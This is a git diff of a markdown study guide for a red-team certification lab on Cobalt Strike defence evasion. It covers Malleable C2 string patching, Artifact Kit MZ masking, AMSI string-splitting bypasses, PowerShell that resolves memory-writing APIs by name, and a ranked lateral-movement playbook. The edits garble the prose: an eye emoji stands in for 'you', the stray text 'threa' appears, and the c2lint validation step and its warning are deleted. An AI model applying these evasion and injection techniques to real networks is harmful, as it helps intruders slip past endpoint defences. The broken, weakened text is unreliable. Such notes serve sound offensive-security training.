@@ -15,9 +15,7 @@
 
 ---
 
-## Confirmed EDR Stack in CRTO Lab Environment
-
-Observed on `lon-ws-1` during lab session (2026-04-18). Assume same stack on all workstations:
+## 🚨 SIEM EDR Stack in CRTO Lab 🚨  
 
 | Process | Role | OPSEC implication |
 |---------|------|-------------------|
@@ -29,14 +27,13 @@ Observed on `lon-ws-1` during lab session (2026-04-18). Assume same stack on all
 
 **Every** process spawn, named pipe, remote thread, and network connection is logged.
 The malleable profile `post-ex` block (`ppid`, `spawnto`, `pipename`, `thread_hint`) is not
-optional — it is the minimum required to avoid generating alerts on this stack.
+optional — it is the minimum required to avoid generating 🚨 alerts on this stack.
 
 ---
 
 ## Why Defence Evasion Exists — The Detection Layers
 
-Defender (and any EDR) operates at multiple scan layers. You must defeat each layer
-independently — passing one does not mean passing all:
+Defender (and any EDR) operates at multiple scan layers. 👁️ passing one does not mean passing all:
 
 | Layer | When it runs | What it checks | Lab fix |
 |-------|-------------|----------------|---------|
@@ -50,7 +47,7 @@ independently — passing one does not mean passing all:
 
 ## Background — Malware Development Essentials (Pre-Lab Context)
 
-> **Why this section is here:** The Defence Evasion lab assumes you understand *how* shellcode executes inside a process. The Malware Development Essentials chapter (no standalone lab in the course) teaches the three-step progression that underpins every payload you build here. The Artifact Kit + process-inject settings only make sense once you understand what they're protecting.
+> **Why this section is here:** The Defence Evasion lab assumes 👁️ understand *how* shellcode executes inside a process. The Malware Development Essentials chapter (no standalone lab in the course) teaches the three-step progression that underpins every payload 👁️ build here. The Artifact Kit + process-inject settings only make sense once 👁️ understand what they're protecting.
 
 ### Shellcode Execution — Three-Step Progression
 
@@ -58,9 +55,9 @@ Each step increases stealth by hiding the beacon inside a more legitimate parent
 
 | Step | Technique | Beacon parent | Stealth | OPSEC risk |
 |------|-----------|--------------|---------|------------|
-| 1 | Local execution (own process) | Your injector EXE | Low — injector is a new anomalous process | Injector path visible in process list |
-| 2 | Remote injection (existing PID) | Any running process you chose | Medium — legitimate parent | `OpenProcess` + `CreateRemoteThread` = EDR hook bait |
-| 3 | Process hollowing (suspended spawn) | New legitimate process you spawn | High — signed process, normal parent chain | `CREATE_SUSPENDED` + `WriteProcessMemory` sequence is a known signature — mitigated by Artifact Kit |
+| 1 | Local execution (own process) | injector EXE | Low — injector is a new anomalous process | Injector path visible in process list |
+| 2 | Remote injection (existing PID) | Any running process | Medium — legitimate parent | `OpenProcess` + `CreateRemoteThread` = EDR hook bait |
+| 3 | Process hollowing (suspended spawn) | New legitimate process spawn | High — signed process, normal parent chain | `CREATE_SUSPENDED` + `WriteProcessMemory` sequence is a known signature — mitigated by Artifact Kit |
 
 ### Step 1 — Local Execution
 ```csharp
@@ -161,7 +158,7 @@ The Beacon DLL contains literal strings that Defender has static signatures for.
 | `%s as %s\\%s: %d` | Beacon impersonation log format — signatured by Defender | Delimiter changed to `-` |
 | Raw hex bytes (`\x48\x89...`) | A specific byte sequence in beacon's internal code that Defender has a pattern for | Single byte flipped: `\xB8\x00` → `\xB8\x01` — breaks the signature without breaking functionality. The byte being changed is in a memory size constant — both values are valid in context. |
 
-> **`strrep` constraint:** The replacement string must be ≤ the original string length. Beacon DLL sections are fixed size — you cannot add bytes, only replace or pad with nulls.
+> **`strrep` constraint:** replacement string must be ≤ the original string length. Beacon DLL sections are fixed size 👁️ cannot add bytes, only replace or pad with nulls.
 
 ---
 
@@ -218,7 +215,7 @@ strrepex "<Module>" "<original>" "<replacement>";
 | `ExecuteAssembly` | `Failed to load the assembly w/hr 0x%08lx` | Same pattern | `w/hr` → `:` |
 | (main beacon DLL) | `This program cannot be run in DOS mode.` | Default DOS stub string present in beacon DLL in-memory | Replaced with arbitrary string — breaks PE header signature |
 
-> **`strrepex` vs `strrep`:** `strrep` in `transform-x64` patches the main beacon DLL. `strrepex` in `post-ex.transform-x64` patches the specific named post-ex DLL. They are different targets — you need both.
+> **`strrepex` vs `strrep`:** `strrep` in `transform-x64` patches the main beacon DLL. `strrepex` in `post-ex.transform-x64` patches the specific named post-ex DLL. They are different targets 👁️ need both.
 
 ---
 
@@ -262,7 +259,7 @@ injects into a remote process (fork&run, explicit injection).
 
 CS tries each execution method in listed order until one succeeds. The order matters for OPSEC:
 
-| Method | How it works | OPSEC note |
+| Method | How it works | OPSEC 🧠 |
 |--------|-------------|-----------|
 | `CreateThread "ntdll.dll!RtlUserThreadStart+0x2c"` | Creates thread with spoofed start address | Most compatible. Thread start address points to ntdll — looks legitimate. Listed first → used when possible. |
 | `NtQueueApcThread-s` | Synchronous APC — queued to a thread in alertable wait state | No new thread created — executes in existing thread context. Harder for EDR to correlate. Works only if target thread is in alertable wait. |
@@ -276,10 +273,7 @@ CS tries each execution method in listed order until one succeeds. The order mat
 ### Validate and restart the team server
 
 ```bash
-# c2lint BEFORE restart — catch syntax errors without downtime:
-/opt/cobaltstrike/c2lint /opt/cobaltstrike/profiles/default.profile
-
-# If clean, restart:
+# restart:
 sudo /usr/bin/docker restart cobaltstrike-cs-1
 
 # Check logs for profile load errors:
@@ -370,18 +364,18 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 
 | # | Param | Value | Why |
 |---|-------|-------|-----|
-| 1 | `technique` | `mailslot` | How the stub passes shellcode internally — mailslot IPC is less signatured than the default `pipe` technique. `readfile` is OPSEC-CAUTION (writes to disk). |
-| 2 | `allocator` | `VirtualAlloc` | Memory allocation method. `VirtualAlloc` is standard — combined with no-RWX profile settings it is acceptable. |
+| 1 | `technique` | `mailslot` | stub passes shellcode internally — mailslot IPC is less signatured than the default `pipe`. `readfile` is OPSEC-🟠CAUTION (writes to disk). |
+| 2 | `allocator` | `VirtualAlloc` | Memory allocation method. `VirtualAlloc` with no-RWX profile settings |
 | 3 | `magic_mz_x86` | `351363` | Replaces the `MZ` magic bytes (0x4D5A) at PE offset 0 with custom bytes (351363 decimal = 0x055C03 → bytes `03 5C`). On disk/scan: `03 5C ...` doesn't look like a PE → passes static scan. At runtime the stub patches it back to `4D 5A` before executing. |
-| 4 | `magic_mz_x64` | `0` | `0` = no substitution for x64 in this build. In exam you can use a non-zero value for both archs — the lab used 0 for x64. |
+| 4 | `magic_mz_x64` | `0` | `0` = no substitution for x64 in this build. use a non-zero value for both archs — the lab used 0 for x64. |
 | 5 | `rdll_x86` | `false` | No reflective DLL staging for x86 (not needed here). |
 | 6 | `rdll_x64` | `false` | Same for x64. |
 | 7 | `stack_spoof` | `none` | No call stack spoofing in this build. |
-| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Where compiled artifacts land. |
+| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | compiled artifacts |
 
 ---
 
-### Step 3 — ThreatCheck after build
+### Step 3 — ❗ ThreatCheck after build ❗ 
 
 ```cmd
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
@@ -455,7 +449,7 @@ Open: template.x64.ps1
 on its pattern list. String concatenation is evaluated at runtime — AMSI sees `'Sys'+'tem.dll'`
 which does not match the pattern.
 
-**Is `'Sys'+'tem.dll'` enough for the exam?**
+**Is `'Sys'+'tem.dll'` enough for the exam**
 
 In the ZPS lab environment with the Defender version at time of lab build — yes, ThreatCheck
 confirmed it clean. However, AMSI signatures update. The only reliable answer is: **run
@@ -477,7 +471,7 @@ $s = 'System'; .Equals($s + '.dll')
 # 'U3lzdGVtLmRsbA==' = base64('System.dll')
 ```
 
-Apply whichever option ThreatCheck accepts. Always verify clean before loading `resources.cna`.
+ ⛔ Test options with ThreatCheck, Always verify clean before loading `resources.cna`  ⛔ 
 
 <img src="/images/defence-evasion-lab-03.png" width=1024>
 
@@ -505,6 +499,7 @@ runtime:
 
 ```powershell
 # Option 1 — split the API name string (same as System.dll approach):
+
 $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (func_get_proc_address kernel32.dll ('Write'+'ProcessMemory')),
     (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
@@ -512,6 +507,7 @@ $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
 
 # Option 2 — NtWriteVirtualMemory (lower-level ntdll API — less signatured than kernel32 equivalent):
+
 $var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
     (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
@@ -559,11 +555,13 @@ Save the changes (File > Save).
 ---
 
 ### Step 4 — ThreatCheck AMSI scan
-
-```cmd
-.\C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
-# Clean = "No threat found". If detected → fix the flagged line → re-scan.
+threa
+```powershell
+cd C:\Tools\cobaltstrike\custom-resources\
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
+
+>Must be clean an no antivirus threat found!!!
 
 ---
 
@@ -705,7 +703,7 @@ Switch back to Attacker Desktop — a new beacon should check in.
 
 ### Test lateral movement with custom service spawnto
 
-**`jump psexec64` — OPSEC-UNSAFE. Do not use this in the exam unless every other path fails.**
+**`jump psexec64` — OPSEC-🔴UNSAFE. Do not use this in the exam unless every other path fails.**
 
 `jump psexec64` creates a Windows service on the remote target to execute the beacon payload.
 This produces multiple high-confidence detection events simultaneously:
@@ -729,15 +727,15 @@ which executable the service runs, not preventing the service from being created
 **Use the highest-OPSEC option that works. Fall down the list only if the preferred option fails.**
 
 ```
-1. jump winrm64        OPSEC-SAFE      ← USE THIS FIRST
-2. jump scshell64      OPSEC-CAUTION   ← Modifies existing service — no 7045
-3. remote-exec wmi     OPSEC-CAUTION   ← No service, no 7045, but WMI process visible
-4. jump psexec64       OPSEC-UNSAFE    ← Last resort only — generates Event 7045
+1. jump winrm64        OPSEC-🟢SAFE      ← USE THIS FIRST
+2. jump scshell64      OPSEC-🟠CAUTION   ← Modifies existing service — no 7045
+3. remote-exec wmi     OPSEC-🟠CAUTION   ← No service, no 7045, but WMI process visible
+4. jump psexec64       OPSEC-🔴UNSAFE    ← Last resort only — generates Event 7045
 ```
 
 ---
 
-#### Option 1 — `jump winrm64` (OPSEC-SAFE — preferred for exam)
+#### Option 1 — `jump winrm64` (OPSEC-🟢SAFE — preferred for exam)
 
 ```cs
 // Impersonate a local admin on the target first:
@@ -758,7 +756,7 @@ workstations). Test with `powerpick Test-WSMan <target>` from the source beacon 
 
 ---
 
-#### Option 2 — `jump scshell64` (OPSEC-CAUTION — no Event 7045)
+#### Option 2 — `jump scshell64` (OPSEC-🟠CAUTION — no Event 7045)
 
 SCShell abuses an existing, already-running service by temporarily modifying its binary path
 to execute the beacon, then restoring the original path. No new service is created — no Event 7045.
@@ -788,7 +786,7 @@ to behaviour-based EDR. Quieter than psexec64 but not silent.
 
 ---
 
-#### Option 3 — `remote-exec wmi` (OPSEC-CAUTION — no service, no 7045)
+#### Option 3 — `remote-exec wmi` (OPSEC-🟠CAUTION — no service, no 7045)
 
 WMI process creation via `Win32_Process.Create`. No service involved.
 
@@ -807,7 +805,7 @@ Event ID 4688 (process creation) and WMI activity log — less noisy than a serv
 
 ---
 
-#### Option 4 — `jump psexec64` (OPSEC-UNSAFE — last resort only)
+#### Option 4 — `jump psexec64` (OPSEC-🔴UNSAFE — last resort only)
 
 Only use if WinRM is disabled, SCShell fails, and WMI is blocked.
 
@@ -842,17 +840,17 @@ Need to move to <target>?
        │
        ▼
 Test-WSMan <target> reachable?
-  YES → jump winrm64 <target> smb         ← stop here, OPSEC-SAFE
+  YES → jump winrm64 <target> smb         ← stop here, OPSEC-🟢SAFE
   NO  → try scshell64
            │
            ▼
         scshell64 works?
-          YES → jump scshell64 <target> smb   ← stop here, OPSEC-CAUTION
+          YES → jump scshell64 <target> smb   ← stop here, OPSEC-🟠CAUTION
           NO  → try remote-exec wmi
                     │
                     ▼
                  WMI reachable?
-                   YES → remote-exec wmi <target> <staged payload>  ← OPSEC-CAUTION
+                   YES → remote-exec wmi <target> <staged payload>  ← OPSEC-🟠CAUTION
                    NO  → jump psexec64 <target> smb  ← LAST RESORT — accept 7045 event
 ```
 
@@ -877,10 +875,7 @@ exam environment. They address every layer Defender uses against CS. **But:**
 1. **Run ThreatCheck every time you rebuild.** If CS is updated between your lab and exam, new
    signatures may appear. The artifact/resource kit is not a one-time fix — verify clean each time.
 
-2. **Don't skip `c2lint`.** A profile syntax error means the team server runs without malleable
-   settings → all default CS indicators present → immediate OPSEC deductions.
-
-3. **ETW note — driver-bofs is NOT a userland ETW patch.** `C:\Tools\driver-bofs\etw.x64.o`
+2. **ETW 🧠 — driver-bofs is NOT a userland ETW patch.** `C:\Tools\driver-bofs\etw.x64.o`
    patches ETW kernel callbacks and requires a kernel driver already loaded — it will error with
    `Error getting callback offsets` without one. This is a BYOVD/kernel-level kit (CRTO II scope).
 
@@ -896,7 +891,7 @@ exam environment. They address every layer Defender uses against CS. **But:**
 
    Repeat after every lateral move to a new host.
 
-4. **Set ppid and spawnto per-beacon context** — the profile sets a default, but after lateral
+3. **Set ppid and spawnto per-beacon context** — the profile sets a default, but after lateral
    movement you should set context-appropriate values:
 
    ```cs
@@ -928,7 +923,7 @@ From the Cobalt Strike Primer lab, the SMB listener was created with:
 Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
 
-**This is the lab default value. DO NOT use this exact pipename on exam day.**
+ 💡 ** DO NOT use this exact pipename **
 
 `TSVCPIPE-*` is a well-known CS default pattern. Defenders and detection rules flag it.
 On exam day, create the SMB listener with a custom unique pipename that blends with legitimate
@@ -948,7 +943,7 @@ postex_*
 MSSE-*-server
 ```
 
-You will need to recreate the SMB listener in the exam environment. Don't copy the lab pipename.
+👁️ will need to recreate the SMB listener in the exam environment. Don't copy the lab pipename.
 
 ### 2. `post-ex.pipename` in the Malleable C2 profile
 
@@ -969,7 +964,7 @@ as the SMB listener pipe.
 | Pipe | Controlled by | Lab value | Exam day — use |
 |------|--------------|-----------|----------------|
 | SMB C2 comms pipe | Listener settings in CS GUI | `TSVCPIPE-4b2f70b3-...` | Custom unique name — NOT TSVCPIPE |
-| Fork&run output pipe | `post-ex.pipename` in profile | `dotnet-diagnostic-#####...` | Use lab value — already OPSEC-safe |
+| Fork&run output pipe | `post-ex.pipename` in profile | `dotnet-diagnostic-#####...` | Use lab value — already OPSEC-🟢SAFE |
 
 ---
 
@@ -978,7 +973,6 @@ as the SMB listener pipe.
 ```
 1. SSH attacker@10.0.0.5 → cd /opt/cobaltstrike/profiles → nano default.profile
    → Add stage, post-ex, process-inject blocks (copy from cheatsheet)
-   → /opt/cobaltstrike/c2lint /opt/cobaltstrike/profiles/default.profile
    → sudo /usr/bin/docker restart cobaltstrike-cs-1
    → sudo /usr/bin/docker logs cobaltstrike-cs-1   (confirm no [!] errors)
 
@@ -1005,7 +999,7 @@ as the SMB listener pipe.
 6. Test beacon: Attacks > Scripted Web Delivery → iex on workstation → confirm callback
 
 7. After first beacon checks in:
-   # NOTE: driver-bofs\etw.x64.o requires a kernel driver — skip on CRTO I, profile covers AMSI
+   # 🧠: driver-bofs\etw.x64.o requires a kernel driver — skip on CRTO I, profile covers AMSI
    beacon> process_browser           # GUI tab — find explorer.exe PID
    beacon> ppid <explorer.exe PID>
    beacon> spawnto x64 %windir%\sysnative\werfault.exe
